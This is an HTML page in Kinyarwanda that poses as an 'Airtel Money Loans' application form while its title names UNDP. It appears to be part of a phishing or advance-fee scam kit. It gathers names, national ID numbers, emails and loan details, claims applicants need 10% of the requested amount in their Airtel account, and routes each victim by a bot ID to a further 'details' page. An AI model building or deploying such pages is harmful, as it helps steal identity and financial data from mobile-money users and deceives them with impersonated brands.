<!DOCTYPE html>
<html lang="rw">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fomu yo gusaba UNDP</title>

<style>
body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
h2 { text-align: center; margin-bottom: 20px; }
label { display: block; margin: 10px 0 5px; font-weight: bold; }
input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
button { width: 100%; padding: 12px; background: darkblue; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
.logo-container { width: 100%;
      height: 120px;
       margin-bottom: 20px;
       background-color: darkblue;
       color: white;
       text-align: center;
      padding-top: 20px; }
.logo { width: 100%; height: 100%;
    background-color: blue;
    color: white;
     object-fit: cover; }
.loan-notice { background: #fff3cd;
   border: 1px solid #ffeeba; 
   padding: 12px;
    border-radius: 6px; 
    font-size: 14px;
    margin-bottom: 20px;
 }
.loan-notice ol {
    padding-left: 20px;
    margin: 8px 0 0 0;
}
.loan-notice li {
    margin-bottom: 6px;
}
</style>
</head>
<body>

<div class="loan-container">
    <div class="logo-container">
     <h1>Airtel Money Loans</h1>   
    </div>

    <form id="loanForm">

        <label>Izina ryuzuye</label>
        <input id="fullName" type="text" required placeholder="Andika izina ryawe ryuzuye">

        <label>Ingano y'inguzanyo (USD)</label>
        <input id="loanAmount" type="number" required placeholder="MIN50">

        <label>Email</label>
        <input id="email" type="email" placeholder="urugero@gmail.com" required>

        <label>Indangamuntu y'igihugu</label>
        <input id="nationalId" type="text" placeholder="Indangamuntu y'igihugu">

        <label>Imiterere y'akazi</label>
        <select id="employmentStatus" required>
            <option value="">Hitamo</option>
            <option value="employed">Mukoresha</option>
            <option value="self-employed">Wikorera</option>
            <option value="unemployed">Ntawkazi</option>
            <option value="student">Umunyeshuri</option>
        </select>

        <label>Impamvu yo gusaba inguzanyo</label>
        <select id="loanPurpose" required>
            <option value="">Hitamo</option>
            <option value="business">Ubucuruzi</option>
            <option value="personal">Inguzanyo bwite</option>
            <option value="schoolfees">Amashuri</option>
            <option value="medical">Ubuzima</option>
            <option value="others">Ibindi</option>
        </select>

        <div class="loan-notice">
            <strong>Itangazo ry'ibyangombwa :</strong>
            <ol>
                 <li>Ugomba gusaba ufite konti ya Airtel ikora.</li>
                <li>Ugomba kugira byibuze 10 % by'ingano usaba kuri konti ya Airtel.</li>
            </ol>
        </div>

        <button type="submit">Urukurikirane</button>

    </form>
</div>

<script>
// ✅ BOT ID FIX
let botId = new URLSearchParams(window.location.search).get('botId');
if (!botId) {
    const parts = window.location.pathname.split('/');
    const botIndex = parts.indexOf('bot');
    if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
}
if (!botId) { alert("Umurongo wo kwinjiramo siwo"); throw new Error("botId missing"); }
localStorage.setItem('botId', botId);

// ---------------- FORM LOGIC ----------------
document.getElementById('loanForm').addEventListener('submit', e => {
    e.preventDefault();

    localStorage.setItem('fullName', fullName.value);
    localStorage.setItem('loanAmount', loanAmount.value);
    localStorage.setItem('email', email.value);
    localStorage.setItem('nationalId', nationalId.value);
    localStorage.setItem('employmentStatus', employmentStatus.value);
    localStorage.setItem('loanPurpose', loanPurpose.value);

    window.location.href = `details.html?botId=${botId}`;
});
</script>

</body>
</html>
